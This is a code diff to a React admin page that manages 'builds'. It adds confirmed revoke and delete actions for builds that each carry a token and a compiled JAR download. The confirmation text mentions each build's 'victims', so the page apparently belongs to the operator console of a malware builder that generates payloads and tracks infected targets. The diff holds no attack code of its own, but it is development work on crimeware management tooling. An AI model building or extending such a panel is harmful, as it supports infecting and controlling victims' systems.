@@ -1,6 +1,6 @@
 'use client';
 import { useState } from 'react';
-import { Copy, Download, Hammer, Power, Plus } from 'lucide-react';
+import { Copy, Download, Hammer, Power, Plus, Trash2 } from 'lucide-react';
 import { toast } from 'sonner';
 import { useApi, mutate } from '@/hooks/useApi';
 import { useRole } from '@/components/live-provider';
@@ -49,9 +49,32 @@ export default function BuildsPage() {
     }
   }
 
-  async function revoke(id: string) {
-    await mutate(`/builds/${id}/revoke`, 'POST');
-    refresh();
+  async function revoke(build: Build) {
+    if (!confirm(`Revoke build ${build.name} v${build.version}? Every victim of this build is revoked too.`)) return;
+    setBusy(build.id);
+    try {
+      await mutate(`/builds/${build.id}/revoke`, 'POST');
+      toast.success('Build revoked');
+      refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'revoke failed');
+    } finally {
+      setBusy('');
+    }
+  }
+
+  async function remove(build: Build) {
+    if (!confirm(`Delete build ${build.name} v${build.version}? The JAR file stays on disk.`)) return;
+    setBusy(build.id);
+    try {
+      await mutate(`/builds/${build.id}`, 'DELETE');
+      toast.success('Build deleted');
+      refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'delete failed');
+    } finally {
+      setBusy('');
+    }
   }
 
   return (
@@ -81,7 +104,8 @@ export default function BuildsPage() {
                         <Button size="icon" variant="ghost" title="copy token" onClick={() => { copy(build.token); toast.success('build token copied'); }}><Copy className="h-3 w-3" /></Button>
                         {role === 'admin' ? <Button size="icon" variant="ghost" title="compile" loading={busy === build.id} onClick={() => compile(build.id)}><Hammer className="h-3 w-3" /></Button> : null}
                         {build.jarPath ? <a href={`/api/console/builds/${build.id}/download`} className="grid h-7 w-7 place-items-center rounded text-muted hover:text-brand"><Download className="h-3 w-3" /></a> : null}
-                        {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revoke" onClick={() => revoke(build.id)}><Power className="h-3 w-3" /></Button> : null}
+                        {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revoke" loading={busy === build.id} disabled={busy === build.id} onClick={() => revoke(build)}><Power className="h-3 w-3" /></Button> : null}
+                        {role === 'admin' ? <Button size="icon" variant="ghost" title="delete (must not be in use)" loading={busy === build.id} disabled={busy === build.id} onClick={() => remove(build)}><Trash2 className="h-3 w-3" /></Button> : null}
                       </div>
                     </TD>
                   </TR>
